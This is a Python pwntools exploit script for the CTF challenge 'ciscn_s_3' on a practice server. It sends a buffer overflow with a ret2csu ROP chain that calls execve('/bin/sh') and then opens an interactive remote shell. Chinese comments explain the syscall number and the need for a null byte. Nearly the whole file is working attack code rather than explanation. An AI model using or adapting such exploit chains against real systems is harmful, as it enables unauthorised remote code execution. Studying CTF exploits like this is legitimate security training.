from pwn import *
context(os='linux',arch='amd64',log_level='debug')
# io  = remote('192.168.95.131',10001)
io = remote('node4.buuoj.cn',29424)
elf = ELF('./ciscn_s_3')

main_addr = elf.symbols["main"]
pop_rdi_ret = 0x4005a3
pop_rsi_r15_ret = 0x4005a1
set_exe_addr = 0x4004e2
sys_call_addr = 0x400517
data_save_addr = 0x601020
csu_gadget_tow_addr = 0x400580
csu_gadget_one_addr = 0x400596


pause()

payload = flat( b"A"*16,csu_gadget_one_addr,
                0x0,0x0,0x1,0x600e10,0x8,data_save_addr,0x0,csu_gadget_tow_addr,
                0x0,0x0,0x0,0x0,0x0,0x0,0x0,pop_rdi_ret,0x0,pop_rsi_r15_ret,data_save_addr,0x0,
                sys_call_addr,csu_gadget_one_addr,
                0x0,0x0,0x1,0x600e10,0x0,data_save_addr,0x0,csu_gadget_tow_addr,
                0x0,0x0,0x0,0x0,0x0,0x0,0x0,
                set_exe_addr,pop_rdi_ret,data_save_addr,pop_rsi_r15_ret,0x0,0x0,
                sys_call_addr,main_addr
            )
pause()
io.sendline(payload)
pause()

#需要注意的点1,59号系统调用是execve那么就可以想办法控制寄存器的值调用execve("/bin/sh",0,0)，注意在调用execve时，后面两个参数需要置0
#需要注意的点2，如果 不加末尾的 \x00 不会成功，或者使用 io.send("/bin/sh")
io.sendline(b"/bin/sh\x00")

io.interactive()